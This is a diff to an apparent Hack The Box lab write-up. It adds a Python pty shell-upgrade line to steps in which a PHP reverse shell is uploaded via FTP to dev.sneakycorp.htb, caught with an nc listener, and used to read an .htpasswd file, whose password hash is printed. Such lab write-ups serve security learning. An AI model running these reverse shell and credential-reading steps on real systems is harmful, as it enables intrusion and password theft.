@@ -162,7 +162,9 @@ once updated put the reverseshell.php using ftp
 
 use nc to open the port listening via ```nc -vlp 1234 ```
 now go to the link on browser that is ```dev.sneakycorp.htb/reverseshell.php```
+ PS: use this```python -c 'import pty; pty.spawn("/bin/bash")'``` mentioned at this website "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" for an upgraded interactive shell.
  ur netcat will give u a shell for www-data, with that go to ```/var/www/pypi.sneakycorp.htb```
+ 
 u will find a ".htpasswd" file there with the following content ```pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
 ```
 on identifying the hash using hashid tool we find the following: 
